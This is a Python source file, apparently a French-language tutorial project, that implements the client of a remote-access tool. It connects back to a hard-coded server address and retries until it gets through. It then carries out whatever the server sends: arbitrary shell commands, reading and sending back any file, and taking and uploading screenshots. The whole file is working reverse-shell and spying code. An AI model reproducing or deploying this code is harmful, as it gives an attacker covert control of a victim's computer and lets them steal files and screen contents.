import os
import socket
import time
import subprocess
import platform
from PIL import ImageGrab

HOST_IP = "192.168.101.109"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

# ....
while True:
    commande = s.recv(MAX_DATA_SIZE)
    if not commande:
        break
    commande = commande.decode()
    commande_split = commande.split(" ")
    if commande == "infos":
        reponse = platform.platform() + " " + os.getcwd()
        reponse = reponse.encode()

    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1])
            reponse = " "
        except FileNotFoundError:
            reponse = "ERREUR : ce répertoire n'exite pas"
        reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "dl":
        try:
            f = open(commande_split[1],"rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        capture_ecran = ImageGrab.grab()
        # capture_ecran.show()
        capture_file_name = commande_split[1] + ".png"
        capture_ecran.save(capture_file_name, "PNG")
        try:
            f = open(capture_file_name,"rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()

    else:
        resultat = subprocess.run(commande, shell=True,
                    capture_output=True, universal_newlines=True)  # dir sur PC


        reponse = resultat.stdout + resultat.stderr
        if not reponse or len(reponse) == 0:
            reponse = " "
        reponse = reponse.encode()
    data_len = len(reponse)
    header = str(data_len).zfill(13)
    # print("longueur du data :",header)
    s.sendall(header.encode())
    if data_len > 0:
        s.sendall(reponse)


s.close()
